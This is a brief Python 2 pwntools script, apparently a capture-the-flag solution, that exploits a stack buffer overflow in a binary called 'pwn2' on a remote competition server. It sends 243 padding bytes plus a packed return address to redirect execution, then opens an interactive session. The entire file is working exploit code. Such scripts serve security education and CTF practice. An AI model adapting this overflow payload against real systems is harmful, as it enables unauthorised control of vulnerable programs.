#!/usr/bin/env python2
#encoding: utf-8

from pwn import *

context.log_level = 'debug'

binary = './pwn2'
e = ELF(binary)
p_f = 0x0804854B

io = remote('pwn.ctf.tamu.edu', 4322)
#io = process(binary)

#gdb.attach(io, '''
#	b echo
#''')

#offset = 243 = 0xf3
ret = p_f
payload = 'a'*0xf3 + pack(ret)
io.recvuntil('I bet I can repeat anything you tell me!\n')
io.sendline(payload)

io.interactive()




